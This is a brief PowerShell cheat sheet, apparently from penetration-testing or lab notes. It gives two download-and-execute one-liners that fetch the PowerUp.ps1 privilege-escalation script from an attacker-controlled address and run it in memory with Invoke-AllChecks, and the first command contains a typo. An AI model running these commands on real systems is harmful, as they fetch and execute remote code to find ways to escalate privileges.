---
title: powershell
category: cheatsheets
order: 1
---


1- Download file

C:> powershell "IEX(New-Objet Net.WebClient).downloadString('http://10.10.14.23/PowerUp.ps1')"

2- RUN powerup
powershell.exe -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.23:8000/PowerUp.ps1');Invoke-AllChecks"
